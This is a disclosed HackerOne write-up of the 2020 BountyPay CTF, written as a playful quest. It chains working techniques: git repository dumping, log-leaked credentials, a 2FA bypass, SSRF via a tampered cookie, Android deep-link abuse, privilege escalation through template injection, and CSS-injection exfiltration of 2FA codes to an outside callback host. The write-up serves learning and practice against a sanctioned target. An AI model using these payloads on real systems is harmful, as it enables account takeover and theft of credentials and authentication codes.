# [H1-2006 2020]  The Story of Making Bounty Hunters Happy

## Report Details
- **Report ID**: 889333
- **URL**: https://hackerone.com/reports/889333
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-06-02T14:29:18.310Z
- **Disclosed**: 2020-06-19T16:11:19.478Z

## Reporter
- **Username**: w31rd0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
**Disclaimer:** I will try to make this post a fun read, given that whoever triagges will be probably going through similar write-ups again and again.

# The beginning:
Being away from HackerOne over a month had made me rusty. Although the call to arms for Mr. Mickos and the community could not be left unanswered.
Therefore once notified by HackerOne's post in Twitter that  CEO @martenmickos had lost his login credentials i decided to attempt my first ever H1 CTF challenge and embark on this journey. Scared I was, but a new challenge would make me get back to hunting (one way or the other).

###Information gathering
As expected prior to any journey or quest. Information about it is essential. Therefore I started with what i could see in the h1-ctf page.
Domain `*.bountypay.h1ctf.com` was the only thing in scope. But having all subdomains as potential targets, made me expect multiple paths to start the journey.
I immediately run a subdomain enumeration with the following command 
`amass enum -d bountypay.h1ctf.com`
This returned the following targets, including many juicy ones like api. , software. staff.
```
staff.bountypay.h1ctf.com
www.bountypay.h1ctf.com
api.bountypay.h1ctf.com
software.bountypay.h1ctf.com
app.bountypay.h1ctf.com
bountypay.h1ctf.com
```
But always the better you know the enemy, the better you can attack it right? So i moved on to further enumerate all potential domains. By running a directory enumeration "attack". The following command returned the most interesting information.
`./dirsearch.py -u https://app.bountypay.h1ctf.com/ -e php,jsp,asp,aspx`
It reveals that a git repository was there and accessible. 
{F851980}
Usually having access to such information is gold therefore i attempted to download it with the following tool
`./git-dumper.py https://app.bountypay.h1ctf.com/ ~/Documents/HackerOne/H1-CTF/git-repository`
Once downloaded i started looking through the newly acquired intel.  Straight away a file and its content stood out. 
Below you can see the content of .git/config file. {F851977}

Of course clicking links is always fun (or risky), so straight away I visited [request-logger]( https://github.com/bounty-pay-code/request-logger.git)
Be warned, this was the last peaceful stop of our journey, before getting our hands dirty in the battles of exploitation.
Upon visiting the presented URL, we could access a .php file named as [logger.php](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php). That initially might seem innocent but by looking closely at the bottom we can see something interesting.
A file named as `bp_web_trace.log` 
{F851982}

This appears to be a logging mechanism which would add new logs to the file in base64 format.
We move forward and try to utilize this info, and we find that we can access the file at [Logs file](https://app.bountypay.h1ctf.com/bp_web_trace.log)
Upon opening the file we see some base64 data presented (as expected)
```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

Using a pen-tester's most trusted companion (Burp), i opened up Decoder tab and put the above base64 encoded data in it. Then selected `Decode as Base64` which returned the following.
```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```
We get an IP, which i noted down (maybe could be used to bypass something later on). But the line that would make every bounty hunter happy is the 2nd and 3rd one. (Yeah we got creds ;) ).

#The battle begins.
Having login credentials, we directly decide to move forward with our first attack attempt (dont forget this is a quest - and every good quest requires a battle).
It appears that those credentials are valid for the `https://app.bountypay.h1ctf.com/` application. Although once we logged in, a wild enemy appeared. We were presented with a 2 Factor Authentication page, asking to submit the (10 characters) password send to us.
It should be expected that things would not be that simple (It is H1 CTF after all).

Trying to submit a random value and by capturing the request we attempted to figure out a bypass method. Trying poisoning to send the token to a server we control failed miserably (probably that is why it mentions a phone number ). So at this point we had to look closer to the following request and find another weakness.
{F851992}
Two parameters are send besides our credentials.Those are `challenge` and `challenge_answer`. This gave me a small idea that they might be related somehow. Challenge was also 32characters, which hints that it might be MD5 hash. 
First attempt was to try see if the challenge was an MD5 of a known string. This failed (first battle lost).
I then thought, that we have already a challenge_answer from the log files (maybe its the same and has not changed), lets use that one. Second battle lost.
Ok lets get back to MD5 idea now. What if we try to change the challenge with the md5 hash of the token we already have from the logs.
`echo -n bD83Jk27dQ | md5sum` this command would give the md5 of the challenge_answer. which rerurned  `5828c689761cce705a1c84d9b1a1ed5e`.
We change the values in the previous request, and YES, battle won, we get a redirect (302 HTTP) (Time for celebration feast? :D )
{F852007}
The request that gave access is the following.
```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 110
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
```
After having a look into the app, we can query  transactions for months/years. Trying to play with all the values returns no information (even for values that are not provided as options in the drop down menu).

##The hidden enemy
Now after some time, i decided to look closer into the requests, as in the web app there is nothing obvious to work with. Request parameters did not give anything interesting, but then i check the cookie that we have set upon login. It was base64 encoded and  it appeared to be JSON. I decode it (yeah in Burp decoder again) and got the following.
`{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`

So to begin with, this is not encrypted, and not a JWT that is signed or anything. So we can try to have some fun with the 2 parameters in it.
Manipulation of the hash parameter, returned an error of **page not found!** which was a strong indication that it might not be a good idea to change this one.
On the other hand changing the value of   **account_id**  returned a different message of `Invalid Account ID`.
Thinking logical, the value appeared to not be bruteforcable, in order to get other valid IDs (brureforcing is usually out-of scope after all)

So we gather up the troops and think of alternative strategies. What i noticed is that on the responses of valid cookies we see that it tries to query the API endpoint. An example response is this
`"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F1gHiqSdpK\/statements?month=01&year=2020"`
So here we can see our user ID in the request and the statements path after it. So an idea popped in, what if we can try to break that URL.

## Attacking the hidden enemy
If not clear by now, the hidden enemy is the cookie. So first attack approach was to see how it behaves. I set the account id value to `./F8gHiqSdpK`, encode the cookie and submit request. Response shows that request was accepted and requested path is the following.
{F852033}

So this has potential (skipping a couple of failed attempts to protect my pride) and what i tried was `"account_id":"./F8gHiqSdpK#"`, and magically (or not) we get a nice and different response with account information. This indicates that we can comment out parts of the URL and actually query the`accounts/./F8gHiqSdpK` endpoint.
{F852041}

Being stuck for a good time on this spot, and with many stuff failing, I remembered me of 2 pieces of information i had gathered before but not used.
1) The subdomain https://software.bountypay.h1ctf.com/ was not accessible directly via our IP (small hint for SSRF here)
{F852046}
2) The API subdomain had a link in the home page as `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API`
By testing the redirect parameter for random pages would return the message `URL NOT FOUND IN WHITELIST`, which shows that we need to find a page that is within that whitelist.

So putting all this together we can use the cookie's `account_id` value to manipulate the path queried (therefore we can traverse back to the redirect endpoint), and then we can try using that to access the software pages via SSRF. Lets put that plan in action. So i set up the following cookie
`{"account_id":"../../redirect?url=https:\/\/software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}`
encode it as base64 and send the request. 
Seems now we are behind enemy lines, as the above request returns a new login page for Software Storage and it seems we bypassed the IP restriction. But now we face another problem, a login page that sends POST request to authenticate. Trying to use GET parameters didnt work, so after some thinking and (failed) googling on how to login. I though of being creative. The page is named Software Storage, therefore it should be hosting something (right?).

I started fuzzing for some directory that would contain some uploaded content and after a few attempts i got a successful hit as /uploads seems to exist and also to be open to access without authentication (Broken Access Control?!). The following request was used
```
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOlwvXC9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tL3VwbG9hZHMjIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=
```
And this was the response
{F852061}

We then proceed to download the APK file, and go to our camp to rest for the day. Hidden enemy defeated.

##Attacking the unknown enemy.

After downloading the APK file. A new challenge was in hand. Mobile testing is an area I have limited experience in, therefore this was an unknown enemy to me that had to be defeated though if i wanted to complete my quest. In order to do so, i summoned a companion @gamerited, which was working also on the CTF and decided to form a party for this journey.

Initially once we load the APK to a phone or in Genymotion we are greeted with the following screen
{F852353}
Setting a `username` and  a `Twitter Handle`, moved to next screen. But no request seems to go through, or anything happening.
There was a button on bottom right that when clicked poped some message. {F852354}
Something was missing, so we decompile the app with jadx-gui to further investigate.
We move into having a look into the manifest.xml file, which usually is a good starting point 
{F852361}
Looking closer we notice some activities like `bounty.pay.PartOneActivity`
We move to bounty.pay tab and locate the PartOneActivity.
{F852366}
Looking closer to the code we locate the following
```
if (getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter("start")) != null && firstParam.equals("PartTwoActivity") && settings.contains("USERNAME"))
```
So we have to find a way to utilize the above and start the PartTwoActivity.
The error message suggested about a Deep Link. So we used adb to make progress.
We initiated adb shell via 
`>adb shell`
And then run
`am start -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity" -n bounty.pay/.PartOneActivity`
Now checking back to our device we see that we have moved to the next Activity labeled as PartTwoActivity
{F852432}
Although we have no content presented here. So need to figure out how to proceed further.
Getting back to the code of PartTwoActivity we see the following
```
 String firstParam = data.getQueryParameter("two");
String secondParam = data.getQueryParameter("switch");
```
{F852438}
There are two parameters here that need to be set properly in order to make content visible. This can be done with the following adb command
`am start -a android.intent.action.VIEW -d "two://part?two=light\&switch=on" -n bounty.pay/.PartTwoActivity`
And now we can see some content, including an input field and a hash.
{F852453}

The hash once again looks like an MD5 so we try once again to crack it online. Multiple sites can do that for us, and we find a successful match
**459a6f79ad9b13cbcb5f692d2cc7a94d -> Token**
Also from the code we saw that it requires an X- to be appended prior to that, So we submit `X-Token` and we move onto next screen

Again looking into the code we see some interesting values in base64. 
{F852463}
Decoding them returns
1. Host
2. X-Token

Also based on the code here it appears that we need to encode the values to be inserted properly
{F852469}
Therefore our final payload will be
```
am start -a android.intent.action.VIEW -d  "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token" -n bounty.pay/.PartThreeActivity
```
A new screen now appears asking for a leaked hash. By using adb logcat we locate the file user_created.xml and by running the following command we can get its contents.
`adb shell cat ./data/data/bounty.pay/shared_prefs/user_created.xml`
And we can get back the following line which is a new weapon in our arsenal
`<string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string> `

Oh and as a small bonus we get the following screen
{F852471}
##Getting Closer to Mordor (Actually Gaining Access to Staff Accounts)
So provided the X-Token we have already obtained we had to find a way to use this new weapon.
On my previous enumeration attempts, i had discovered this path `https://api.bountypay.h1ctf.com/api/staff` although it would return `"Missing or invalid Token"`.
So now i attempted to use the new X-Token, hoping it would be useful and not all previous work was just a side-quest with no true reward.

Submitting the following request returned some new information 
```
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Upgrade-Insecure-Requests: 1
```
Some staff member names as also their staff_ids
{F852115}

So here was another spot i was stuck for a long time. What seemed interesting was that i change the request into a POST request. and it appears i could submit requests with the `staff_id` parameter. Although it did not appear to have a lot of potential as using any of the ids obtained from above request returned a message of `Staff Member already has an account` and using a random id would return `Invalid Staff ID`. I was really stuck at this point, as i tried stuff like SQLi but i failed. Then i noticed a chat that a hint was given in twitter (thanks discord server).

Going into HackerOne's profile I saw a post from an account named `BountyPay HQ` that had a clear reference to bounty payments. Visiting the account had more tweets in it. One of them stood out though, which welcomed a new member in the team.
{F852122}
But who is this Sandra really? She did not appear in /api/staff request. So lets use some OSINT superpowers to find out. Clicking on the people that [BountyPay HQ](https://twitter.com/BountypayHQ)  profile was following revealed an account named [Sandra Allison](https://twitter.com/SandraA76708114). So Sandra appears to not be trained in the secret ways of Social Media danger avoidance, and in her profile we can see a picture of her badge with the Bounty Pay logo.
Looking closer we see that her staff_id is on the badge (bad move Sandra, bad move)
{F852137}

Now back to our /api/staff request, hoping for the best.
We resubmit the POST request from above with the newly obtained staff_id .... and BOOM, we get something nice (small win dance now).
we get cleartext credentials for sandra's account
**Request:**
```
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:8FJ3KFISL3
```
**Response:**
```
{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

##We Are In (thanks to sandra)
Now we try this credentials into the [staff login](https://staff.bountypay.h1ctf.com/?template=login). And we successfully authenticate.
Looking around though, makes us feel really disappointed. There is nothing obvious in her  profile. Playing a bit with available menus, doesnt give any attack vector. Then going through the burp proxy history i notice something interesting. There is a https://staff.bountypay.h1ctf.com/js/website.js file which is a custom JavaScript file. Going through it we notice 2 functions that appear interesting
 1. upgradeToAdmin
 2. sendReport

First one seems to be accessible only for admins, while second one just returns a response that Report has been received.
Trying to submit XSS payload via the sendReport functionality, hoping to get the administrators cookies, did not return anything.
At this point i was strongly confident that the JS code was the one to focus into. Also based on the messages we had, we should somehow make the admin upgrade our account.
We could only alter two parameters, the `profile_name` and the `profile_avatar` .
Injecting any special character would be removed (again no XSS).
Upon changing the avatar to a random value, we see that it is inserted into a class attribute, which seemed interesting.
{F852155}

Also in the JavaScript file, there was a line at the bottom which had some checks and if they were met it would trigger a click event. (presenting a part of it below)
`document.location.hash.length>0&&("#tab1"===document.location.hash&&$(".tab1").trigger("click")`

Based on that it appeared that we had to craft a url like `https://staff.bountypay.h1ctf.com/?template=home#tab1` to trigger the click.
If the click was triggered the upgradeToAdmin function could be invoked (interesting right?!)

At this point i tried to bring into play the avatar manipulation from above, i had attempted to inject different stuff, but i was not sure what i was doing at that point. Having in mind the question above though, and while in the process of fuzzing and examining the outcome of injecting into the avatar parameter i set its value to the following `profile_avatar=tab1+upgradeToAdmin` at some point.
What i noticed while monitoring the behavior of the requests was the following
{F852169}
When i used a request with hash.location set to tab1, a request was automatically send to upgrade an account.


##Problems! more problems!
Although this request was sent with `username=undefined`. So we need to find a way for the request to pull a username. Going through the accessible pages  and trying to set a GET request parameter as username did not seem to work.
A new problem was in-front of me which got me stuck for some time. Maybe my journey was going to end here i thought. Quest failed I thought.

Taking a break and getting back to it, made me think "Where we can control the username?" and only the login page came into mind.
Visiting it was easy to confirm that we can set the username via a GET request.
`https://staff.bountypay.h1ctf.com/?template=login&username=sandra.allison`
which is also confirmed by the way the website.js set the username in the upgrade request
{F852180}

But now, we have another problem. In the login page, we can not trigger the JavaScript code. 
One problem after the other coming our way. Obviously this is a H1-CTF, so it wont be painless.
**One Does Not Simply Walk into Mordor** after all

After a few hours of  banging my head, and googling resources (thankfully focusing towards php helped a bit), i came up with the following method, that allowed me to include both pages into one.
The login to pull the username and the authenticated pages to run the JS code
`https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=home#tab1`
As can be observed in the below image, the upgradeToAdmin request is issued and it has our username set. I figured out that we have to have the login template first in order to get the username into the JS function.
{F852197}

We getting close, but still missing a small last part. How will our avatar trigger for Admin, seemed like a Self trigger in my "tired" mind.
But then i recalled that another functionality exists. Tickets!!
When visiting the one ticket we have access to, both our Avatar and the Admin's avatar are displayed. So that should be the way to force the Admin into upgrading us. 
So we base64 encode our above URL. and submit the report like this
`https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109aG9tZSN0YWIx`

Then loading the page again, shows that we successfully did the Privilege Escalation. We now have admin privileges
{F852205}
And finally Goal achieved, we get the credentials for mr. Mickos
`marten.mickos	: h&H5wy2Lggj*kKn4OD&Ype`

We use the credentials and login to the [App Bounty](https://app.bountypay.h1ctf.com/)
We are presented again with 2FA. Here i randomly entered a value calculated its md5 and changed the challenge parameter to see if it would accept anything, and if it only checks the md5 against the challenge_answer.
```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 124
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

username=marten.mickos&password=h%26H5wy2Lggj*kKn4OD%26Ype&challenge=827ccb0eea8a706c4c34a16891f84e7b&challenge_answer=12345
```

This gave us access again to the payments panel. After enumerating a bit we discover that there is a payment for `month=05&year=2020`.
Ok lets pay the hackers and save the day then.

But then.... 2FA again. DAMN. And this is different than the previous implementation. We can not bypass the same way.

Hackers should wait a bit more for the payment.

##Final Boss Fight
Upon attempting to submit a request to get a 2FA token the following request was made
{F852302}
At the POST parameter, we can see that a .css file is send. By replacing that value, with a server we control, we can see that we get a callback, also we can notice that special characters are filtered 
e.g. Sending `"><h1>te</h1>` will be `h1teh1`

So given the name of the file and that we can contact the server of our choosing, CSS injection for data ex-filtration comes to mind. An attack i had never attempted, only read about.
After reading one blog post after the other, and attempting to use payloads presented directly, by assuming input name would be `challenge_answer` i got nothing.

So i decided to start from point 0. I stared by trying to enumerate all possible tags presented in that page.

so i created a tags.css file containing content like the following
```
$i {
    background-image: url(https://637k79ooa94s4auqo3b4vru21t7nvc.burpcollaborator.net/$i);
}
```
Where $i was replaced by the possible tag values (e.g. body).  When uploaded to the server and send over to the application, it would send a request to our collaborator appending the tag value that was found. Once running it we got the following valid tags.
```
input
html
head
div
link
input
body
```

Now we have something that works as also tag values.
We used some assumptions here and went for the input tag. We now wanted to find the input tag name

Here i should note down that i suck in programming, i do not like it, barely know it. So next steps are totally unorthodox.
So i used a bash script to create a file with all potential values based on the following template
```
input[name^=$i] ~ *{
    background-image: url(https://m6t0apr4dp787qx6rjeky7xi49a0yp.burpcollaborator.net/exfil/$i);
}
```
I included a charset of a-zA-Z0-9 and the - _ characters.
Example of my bash script was
```
for i in {a..z}; do echo "input[name^=$i] ~ *{
    background-image: url("https://m6t0apr4dp787qx6rjeky7xi49a0yp.burpcollaborator.net/exfil/$i");
}"; done > test1.css
```
So i exfiltrate one letter at a time. Building on that we reach this part
```
 for i in {a..z}; do echo "input[name^=code_$i] ~ *{
    background-image: url("https://m6t0apr4dp787qx6rjeky7xi49a0yp.burpcollaborator.net/exfil/code_$i");
}"; done >> test-name.css
```

At this point when we send the new payload css file, we got 6 requests. We were now aware that we have 6 input fields code_1 up to code_6
{F852299}

Keep working with our "bad" automation method. We created a file that included all potential values for all 6 input code fields.
Here is the file used F852310. We inject our file again in the captured request of the 2FA generation as below
```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https://babe22004931.ngrok.io/testfinal.css
```
So we not get 6 request back. With values, so we assume we got the 2FA code. Request is presented below which show the value for input field code_1
{F852316}

We then submit the code, and we get `Invalid code entered`. This last boss seems to be a cat, has multiple lifes.
I reattempted to get the values but each and every time i got either less than 6 or Invalid code.

So i was sure i was missing something. I move to the input field and I manually manage to identify that it allows you to enter up to 7 characters.
Probably that was the problem, but running the input enumeration script again, always gave 6 fields.

So tough times require extreme measures.
I run my 2FA extraction injection again, get the 6 values, then enter them, and capture the request. Send to BURP intruder and fire up a BruteForce attack on last value hoping for the best (and for luck). I used a namespace of a-zA-Z cause during all previous attempts only letters were extracted

And YES, i get a valid hit, a response of different size {F852324}.
I move to response and Render the page, and a moment of glory awaits.
We delivered the killing blow onto the boss.

We get a page with a Congratulations Message and with the flag, letting us know that our quest is over and we can enjoy the reward of the quest 
(having the ability to be proud of completing our first ever H1-CTF)
{F852325}

 **BIG VICTORY DANCE**
 **GAME OVER**

##Outro
This was the tale of @w31rd0 and @gamerited journey towards helping poor Mr Mickos and the HackerOne community.
Hope you find the tale fun and interesting and all steps were explained properly with enough evidence.
Thanks for creating the challenge and for your time reading all this.

## Considerations
1) I was stuck for hours trying again and again the CSS injection part. For some reason the number of extracted values varied between every execution of the request with the injected CSS, tried to include numbers and special chars, in case i was missing something, with no luck. This part was a bit annoying to be honest as i could not figure out  i was doing wrong. Additionally i am not sure if last digit was intended to be bruteforce, but seemed the only way for me to do it at that point. But CTFs are about getting the flag after all (intended way or unintended), right?
2) The twitter hint was not that obvious and i kind of missed it, luckily there was Discord server that let me know about it.

## Impact

Save the HackerOne community's payment

## Attachments
- Screenshot_from_2020-06-02_08-47-54.png
- git-repo-dirsea.png
- Screenshot_from_2020-06-02_08-57-47.png
- 2fa-request-burp.png
- login-2fa-byppased.png
- cookie-manipulated.png
- cookie-comment-out.png
- 401-ip-blocked.png
- apk-found.png
- staff-queried.png
- sandra-tweet-welcome.png
- sandra-badge.png
- class-attribrute.png
- request-upgrade-toAdmin-triggered.png
- username-set.png
- upgradeToAdmin-username-set.png
- admin-panel.png
- code-name-extracted.png
- 2fa-request-payment.png
- testfinal.css
- 2fa-extracted.png
- bf-last-char.png
- flag.png
- 1st-screen.png
- deep-links.png
- manifest-xml.png
- activity-one.png
- activity-two.png
- code-for-activity-two.png
- activity-3.png
- code-part-3.png
- encoding-required-part3.png
- challenges-done.png
